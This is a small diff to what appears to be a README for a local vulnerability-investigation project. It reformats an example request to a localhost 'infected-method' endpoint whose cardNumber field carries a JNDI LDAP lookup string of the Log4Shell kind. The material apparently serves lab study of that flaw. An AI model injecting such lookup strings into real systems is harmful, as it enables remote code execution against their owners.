@@ -17,8 +17,8 @@
 
 Use next method for investigations.
 
-http://localhost:8080/api/infected-method
-cardNumber: ${jndi:ldap://localhost:8082/api/long-wait}
+    GET http://localhost:8080/api/infected-method
+    cardNumber: ${jndi:ldap://localhost:8082/api/long-wait}
 
 ####Curl request example
     
